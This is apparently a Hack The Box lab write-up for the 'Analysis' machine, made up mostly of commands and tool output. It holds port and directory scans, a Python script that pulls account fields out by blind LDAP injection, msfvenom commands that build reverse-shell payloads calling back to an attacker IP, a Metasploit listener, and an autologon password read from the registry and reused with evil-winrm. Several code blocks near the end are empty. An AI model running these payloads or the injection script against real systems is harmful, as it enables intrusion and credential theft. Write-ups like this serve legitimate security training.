---
title: "HTB Writeup: Analysis"
author: xpnt
date: 2024-05-30
image:
  path: https://pbs.twimg.com/media/GEI9wJrXwAAaI8d?format=jpg&name=medium
  height: 1500
  width: 500
categories: [Hack The Box, "Season 4: Savage Lands"]
tags: [labs,ldap_injection,feroxbuster,autologon,ffuf,dll_hijacking,snort]
---

- [Link: Pwned Date](https://www.hackthebox.com/achievement/machine/1504363/584)

```bash
# Nmap 7.94SVN scan initiated Wed May 29 16:16:01 2024 as: nmap -sCV -n -Pn -p53,80,88,135,139,389,445,464,593,636,3268,3269,3306,5985,9389,33060,47001,49664,49665,49666,49669,49671,4
9676,49677,49680,49681,49688,49715,52527 -oN scanPorts 10.10.11.250
Nmap scan report for 10.10.11.250
Host is up (0.12s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-29 20:16:05Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3306/tcp  open  mysql         MySQL (unauthorized)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  msrpc         Microsoft Windows RPC
49715/tcp open  msrpc         Microsoft Windows RPC
52527/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=5/29%Time=66578D0F%P=x86_64-pc-linux-gnu%
SF:r(GenericLines,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GetRequest,9,"\x05\0
SF:\0\0\x0b\x08\x05\x1a\0")%r(HTTPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0"
SF:)%r(RTSPRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(RPCCheck,9,"\x05\0\
SF:0\0\x0b\x08\x05\x1a\0")%r(DNSVersionBindReqTCP,9,"\x05\0\0\0\x0b\x08\x0
SF:5\x1a\0")%r(DNSStatusRequestTCP,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\
SF:0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(SSLSe
SF:ssionReq,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88
SF:'\x1a\x0fInvalid\x20message\"\x05HY000")%r(TerminalServerCookie,9,"\x05
SF:\0\0\0\x0b\x08\x05\x1a\0")%r(TLSSessionReq,2B,"\x05\0\0\0\x0b\x08\x05\x
SF:1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY00
SF:0")%r(Kerberos,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(SMBProgNeg,9,"\x05\0
SF:\0\0\x0b\x08\x05\x1a\0")%r(X11Probe,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1
SF:e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(F
SF:ourOhFourRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LPDString,9,"\x05\
SF:0\0\0\x0b\x08\x05\x1a\0")%r(LDAPSearchReq,2B,"\x05\0\0\0\x0b\x08\x05\x1
SF:a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000
SF:")%r(LDAPBindReq,46,"\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01\x08\x01\
SF:x10\x88'\x1a\*Parse\x20error\x20unserializing\x20protobuf\x20message\"\
SF:x05HY000")%r(SIPOptions,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(LANDesk-RC,
SF:9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(TerminalServer,9,"\x05\0\0\0\x0b\x0
SF:8\x05\x1a\0")%r(NCP,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(NotesRPC,2B,"\x
SF:05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'\x1a\x0fInvali
SF:d\x20message\"\x05HY000")%r(JavaRMI,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r
SF:(oracle-tns,32,"\x05\0\0\0\x0b\x08\x05\x1a\0%\0\0\0\x01\x08\x01\x10\x88
SF:'\x1a\x16Invalid\x20message-frame\.\"\x05HY000")%r(ms-sql-s,9,"\x05\0\0
SF:\0\x0b\x08\x05\x1a\0")%r(afp,2B,"\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0
SF:\x01\x08\x01\x10\x88'\x1a\x0fInvalid\x20message\"\x05HY000")%r(giop,9,"
SF:\x05\0\0\0\x0b\x08\x05\x1a\0");
Service Info: Host: DC-ANALYSIS; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -5s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-05-29T20:17:07
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed May 29 16:17:21 2024 -- 1 IP address (1 host up) scanned in 80.21 seconds
```

- Luego

```bash
echo '10.10.11.250 analysis.htb' | sudo tee -a /etc/hosts


```


```bash
dig analysis.htb @10.10.11.250

; <<>> DiG 9.19.21-1-Debian <<>> analysis.htb @10.10.11.250
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 16723
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;analysis.htb.			IN	A

;; ANSWER SECTION:
analysis.htb.		600	IN	A	10.10.11.250

;; Query time: 119 msec
;; SERVER: 10.10.11.250#53(10.10.11.250) (UDP)
;; WHEN: Wed May 29 16:53:04 EDT 2024
;; MSG SIZE  rcvd: 57

```

```

dig ns analysis.htb @10.10.11.250

; <<>> DiG 9.19.21-1-Debian <<>> ns analysis.htb @10.10.11.250
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 17276
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;analysis.htb.			IN	NS

;; ANSWER SECTION:
analysis.htb.		3600	IN	NS	dc-analysis.analysis.htb.

;; ADDITIONAL SECTION:
dc-analysis.analysis.htb. 3600	IN	A	10.10.11.250

;; Query time: 124 msec
;; SERVER: 10.10.11.250#53(10.10.11.250) (UDP)
;; WHEN: Wed May 29 16:54:03 EDT 2024
;; MSG SIZE  rcvd: 83
```


```bash
; <<>> DiG 9.19.21-1-Debian <<>> any analysis.htb @10.10.11.250
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 20114
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;analysis.htb.			IN	ANY

;; ANSWER SECTION:
analysis.htb.		600	IN	A	10.10.11.250
analysis.htb.		3600	IN	NS	dc-analysis.analysis.htb.
analysis.htb.		3600	IN	SOA	dc-analysis.analysis.htb. hostmaster.analysis.htb. 230 900 600 86400 3600

;; ADDITIONAL SECTION:
dc-analysis.analysis.htb. 3600	IN	A	10.10.11.250

;; Query time: 123 msec
;; SERVER: 10.10.11.250#53(10.10.11.250) (TCP)
;; WHEN: Wed May 29 16:58:03 EDT 2024
;; MSG SIZE  rcvd: 146
```


```bash
gobuster vhost -u http://analysis.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain -t 150
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://analysis.htb
[+] Method:          GET
[+] Threads:         150
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: internal.analysis.htb Status: 403 [Size: 1268]
Progress: 19966 / 19967 (99.99%)
===============================================================
Finished
===============================================================
```

```bash
feroxbuster -u http://internal.analysis.htb -C 404 -r -w /usr/share/seclists/Discovery/Web-Content/common.txt
                                                                                                                                                                                       
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://internal.analysis.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 📍  Follow Redirects      │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       91w     1273c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET       29l       93w     1284c http://internal.analysis.htb/
403      GET       29l       93w     1284c http://internal.analysis.htb/dashboard/
403      GET       29l       93w     1284c http://internal.analysis.htb/dashboard/css/
200      GET        4l        4w       38c http://internal.analysis.htb/dashboard/index.php
403      GET       29l       93w     1284c http://internal.analysis.htb/dashboard/img/
403      GET       29l       93w     1284c http://internal.analysis.htb/dashboard/js/
403      GET       29l       93w     1284c http://internal.analysis.htb/dashboard/lib/
403      GET       29l       93w     1284c http://internal.analysis.htb/dashboard/lib/chart/
403      GET       29l       93w     1284c http://internal.analysis.htb/dashboard/uploads/
[####################] - 30s    37854/37854   0s      found:9       errors:0      
[####################] - 13s     4728/4728    358/s   http://internal.analysis.htb/ 
[####################] - 13s     4728/4728    355/s   http://internal.analysis.htb/dashboard/ 
[####################] - 13s     4728/4728    362/s   http://internal.analysis.htb/dashboard/css/ 
[####################] - 13s     4728/4728    358/s   http://internal.analysis.htb/dashboard/img/ 
[####################] - 13s     4728/4728    359/s   http://internal.analysis.htb/dashboard/js/ 
[####################] - 13s     4728/4728    363/s   http://internal.analysis.htb/dashboard/lib/ 
[####################] - 13s     4728/4728    375/s   http://internal.analysis.htb/dashboard/lib/chart/ 
[####################] - 13s     4728/4728    371/s   http://internal.analysis.htb/dashboard/uploads/  
```

```bash
feroxbuster -u http://internal.analysis.htb -C 404 -r -w /usr/share/seclists/Discovery/Web-Content/big.txt  -x php
```

```bash
ffuf -u http://internal.analysis.htb/FUZZ -recursion -recursion-depth 1 -w /usr/share/seclists/Discovery/Web-Content/big.txt  -e .php -t 200 -v

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 174, Words: 9, Lines: 2, Duration: 127ms]
| URL | http://internal.analysis.htb/dashboard
| --> | http://internal.analysis.htb/dashboard/
    * FUZZ: dashboard

[INFO] Adding a new job to the queue: http://internal.analysis.htb/dashboard/FUZZ

[Status: 301, Size: 174, Words: 9, Lines: 2, Duration: 120ms]
| URL | http://internal.analysis.htb/employees
| --> | http://internal.analysis.htb/employees/
    * FUZZ: employees

[INFO] Adding a new job to the queue: http://internal.analysis.htb/employees/FUZZ

[Status: 301, Size: 170, Words: 9, Lines: 2, Duration: 2864ms]
| URL | http://internal.analysis.htb/users
| --> | http://internal.analysis.htb/users/
    * FUZZ: users

[INFO] Adding a new job to the queue: http://internal.analysis.htb/users/FUZZ

[INFO] Starting queued job on target: http://internal.analysis.htb/dashboard/FUZZ

[Status: 200, Size: 38, Words: 3, Lines: 5, Duration: 129ms]
| URL | http://internal.analysis.htb/dashboard/Index.php
    * FUZZ: Index.php

[Status: 301, Size: 178, Words: 9, Lines: 2, Duration: 123ms]
| URL | http://internal.analysis.htb/dashboard/css
| --> | http://internal.analysis.htb/dashboard/css/
    * FUZZ: css

[WARN] Directory found, but recursion depth exceeded. Ignoring: http://internal.analysis.htb/dashboard/css/
[Status: 200, Size: 35, Words: 3, Lines: 5, Duration: 124ms]
| URL | http://internal.analysis.htb/dashboard/details.php
    * FUZZ: details.php

[Status: 200, Size: 35, Words: 3, Lines: 5, Duration: 125ms]
| URL | http://internal.analysis.htb/dashboard/emergency.php
    * FUZZ: emergency.php

[Status: 200, Size: 35, Words: 3, Lines: 5, Duration: 127ms]
| URL | http://internal.analysis.htb/dashboard/form.php
    * FUZZ: form.php

[Status: 301, Size: 178, Words: 9, Lines: 2, Duration: 122ms]
| URL | http://internal.analysis.htb/dashboard/img
| --> | http://internal.analysis.htb/dashboard/img/
    * FUZZ: img

[WARN] Directory found, but recursion depth exceeded. Ignoring: http://internal.analysis.htb/dashboard/img/
[Status: 200, Size: 38, Words: 3, Lines: 5, Duration: 124ms]
| URL | http://internal.analysis.htb/dashboard/index.php
    * FUZZ: index.php

[Status: 301, Size: 177, Words: 9, Lines: 2, Duration: 124ms]
| URL | http://internal.analysis.htb/dashboard/js
| --> | http://internal.analysis.htb/dashboard/js/
    * FUZZ: js

[WARN] Directory found, but recursion depth exceeded. Ignoring: http://internal.analysis.htb/dashboard/js/
[Status: 301, Size: 178, Words: 9, Lines: 2, Duration: 122ms]
| URL | http://internal.analysis.htb/dashboard/lib
| --> | http://internal.analysis.htb/dashboard/lib/
    * FUZZ: lib

[WARN] Directory found, but recursion depth exceeded. Ignoring: http://internal.analysis.htb/dashboard/lib/
[Status: 302, Size: 3, Words: 1, Lines: 1, Duration: 2921ms]
| URL | http://internal.analysis.htb/dashboard/logout.php
| --> | ../employees/login.php
    * FUZZ: logout.php

[Status: 200, Size: 35, Words: 3, Lines: 5, Duration: 126ms]
| URL | http://internal.analysis.htb/dashboard/tickets.php
    * FUZZ: tickets.php

[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 132ms]
| URL | http://internal.analysis.htb/dashboard/upload.php
    * FUZZ: upload.php

[Status: 301, Size: 182, Words: 9, Lines: 2, Duration: 124ms]
| URL | http://internal.analysis.htb/dashboard/uploads
| --> | http://internal.analysis.htb/dashboard/uploads/
    * FUZZ: uploads

[WARN] Directory found, but recursion depth exceeded. Ignoring: http://internal.analysis.htb/dashboard/uploads/
[INFO] Starting queued job on target: http://internal.analysis.htb/employees/FUZZ

[Status: 200, Size: 1085, Words: 413, Lines: 30, Duration: 133ms]
| URL | http://internal.analysis.htb/employees/Login.php
    * FUZZ: Login.php

[Status: 200, Size: 1085, Words: 413, Lines: 30, Duration: 128ms]
| URL | http://internal.analysis.htb/employees/login.php
    * FUZZ: login.php

[INFO] Starting queued job on target: http://internal.analysis.htb/users/FUZZ

[Status: 200, Size: 17, Words: 2, Lines: 1, Duration: 130ms]
| URL | http://internal.analysis.htb/users/list.php
    * FUZZ: list.php

:: Progress: [40952/40952] :: Job [4/4] :: 149 req/sec :: Duration: [0:01:02] :: Errors: 0 ::
```

![](/assets/images/HTB-Writeup-Analysis/Pasted image 20240529164137.png)

- So bruteforce parameters

```bash
ffuf -c -w /usr/share/seclists/Fuzzing/LDAP-openldap-attributes.txt -u "http://internal.analysis.htb/users/list.php?name=*)(FUZZ=*" -ic -mr technician

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/users/list.php?name=*)(FUZZ=*
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LDAP-openldap-attributes.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: technician
________________________________________________

accountExpires          [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 141ms]
badPasswordTime         [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 129ms]
badPwdCount             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 141ms]
cn                      [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 127ms]
codePage                [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 125ms]
countryCode             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 129ms]
createTimestamp         [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 132ms]
description             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 125ms]
displayName             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 134ms]
distinguishedName       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 131ms]
dSCorePropagationData   [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 132ms]
givenName               [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 136ms]
instanceType            [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 126ms]
lastLogoff              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 130ms]
lastLogon               [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 198ms]
logonCount              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 139ms]
modifyTimestamp         [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 131ms]
msDS-parentdistname     [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 134ms]
name                    [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 125ms]
objectCategory          [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 127ms]
nTSecurityDescriptor    [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 132ms]
objectClass             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 126ms]
objectGUID              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 126ms]
objectSid               [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 129ms]
primaryGroupID          [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 134ms]
pwdLastSet              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 143ms]
replPropertyMetaData    [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 130ms]
sAMAccountName          [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 125ms]
sAMAccountType          [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 129ms]
userAccountControl      [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 133ms]
userPrincipalName       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 151ms]
uSNCreated              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 153ms]
uSNChanged              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 161ms]
whenCreated             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 169ms]
whenChanged             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 188ms]
:: Progress: [1342/1342] :: Job [1/1] :: 289 req/sec :: Duration: [0:00:04] :: Errors: 0 ::

```

- Retrieve password(description field)

```python
#!/usr/bin/python3
import requests
import string
from time import sleep
import sys

proxy = {"http": "127.0.0.1:8080"}
url = "http://internal.analysis.htb/users/list.php"
alphabet = string.digits + string.ascii_letters 

a = "description"
attributes = a.split(",")

users = "technician,amanson,badam,jangel,lzen".split(",")

def oracle(q):
    u = url + f'?name={q}'
    r = requests.get(u, proxies=proxy)
    return f"{user}" in r.text

def verify(q):
    global value
    for testchar in alphabet:
        if oracle(q+testchar):
            value += "*"
            return(True)
    return(False)          

for user in users:
    print(f"Now user : {user}")
    for attribute in attributes: 
        value = ""
        finish = False
        while not finish:
            for char in alphabet: 
                query = f"{user})({attribute}={value}{char}*"
                if oracle(query):
                    value += str(char)
                    print(value)
                    break
                if char == alphabet[-1] and not verify(query[:-2]+"*"):
                    finish = True
                    
    print("\n\n")
```

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.196 LPORT=4444 -f exe -o shell.exe
  
curl 10.10.14.196/shell.exe -o shell.exe

C:\inetpub\internal\dashboard\uploads\shell.exe
  
nc -lvnp 4444 

```

![](/assets/images/HTB-Writeup-Analysis/Pasted image 20240530090848.png)


```bash
❯ msfconsole -q
[*] Starting persistent handler(s)...
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.10.14.196
msf6 exploit(multi/handler) > set lport 4444
msf6 exploit(multi/handler) > run
```

```powershell
C:\inetpub\internal\dashboard\uploads>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ    analysis.htb.
    DefaultUserName    REG_SZ    jdoe
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    ShellAppRuntime    REG_SZ    ShellAppRuntime.exe
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x1ab910533
    ShutdownFlags    REG_DWORD    0x13
    DisableLockWorkstation    REG_DWORD    0x0
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    7y4Z4^*y9Zzj
    AutoLogonSID    REG_SZ    S-1-5-21-916175351-3772503854-3498620144-1103
    LastUsedUsername    REG_SZ    jdoe

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDefaults
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey
```

```bash
evil-winrm -u 'jdoe' -p '7y4Z4^*y9Zzj' -i 10.10.11.250
cmd /c "type %USERPROFILE%\Desktop\root.txt"
```

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.196 LPORT=443 -f dll -o sf_engine.dll
```

```bash
```
```bash
```
```bash
```
```bash
```
```bash
```
```bash
```

>I hope you had as much fun reading this write up as I did writing it. If this writeup helped you, please feel free to go to my [`Hack The Box profile (xpnt)`](https://app.hackthebox.com/profile/1504363) and give me a respect 😁. Happy Hacking!!👾
{: .prompt-tip }